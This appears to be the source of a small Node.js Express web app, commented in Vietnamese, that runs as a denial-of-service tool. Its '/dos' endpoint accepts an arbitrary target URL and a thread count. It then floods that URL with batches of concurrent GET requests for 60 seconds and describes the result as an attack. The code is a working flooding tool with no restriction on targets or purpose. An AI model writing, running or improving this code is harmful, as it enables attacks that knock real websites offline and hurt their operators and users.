const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/dos', (req, res) => {
    const url = req.body.url;
    const threads = parseInt(req.body.threads, 10);
    const duration = 60000; // Thời gian chạy (ms), ví dụ: 60 giây

    if (!url.startsWith('http')) {
        return res.send('URL không hợp lệ. Vui lòng nhập URL bắt đầu bằng http:// hoặc https://');
    }

    if (isNaN(threads) || threads <= 0) {
        return res.send('Số lượng threads không hợp lệ!');
    }

    let isRunning = true;
    const startTime = Date.now();

    // Khởi động các threads liên tục trong 60 giây
    const startAttacks = () => {
        if (isRunning) {
            const currentTime = Date.now();
            if (currentTime - startTime >= duration) {
                isRunning = false;
                return res.send('Quá trình tấn công đã kết thúc sau 60 giây.');
            }

            const attackPromises = [];
            for (let i = 0; i < threads; i++) {
                attackPromises.push(
                    axios.get(url)
                        .catch((error) => {
                            console.error(`Error making request to ${url}:`, error.message);
                            return null; // Đảm bảo không có lỗi bị ném ra
                        })
                );
            }
            Promise.all(attackPromises).then(() => {
                // Gửi yêu cầu xong thì đợi 1 giây và gọi lại hàm này
                setTimeout(startAttacks, 0); // 1000 ms = 1 giây
            });
        }
    };

    startAttacks();
});

app.listen(process.env.PORT || 8080, () => {
    console.log(`Server is running on port ${process.env.PORT || 8080}`);
});
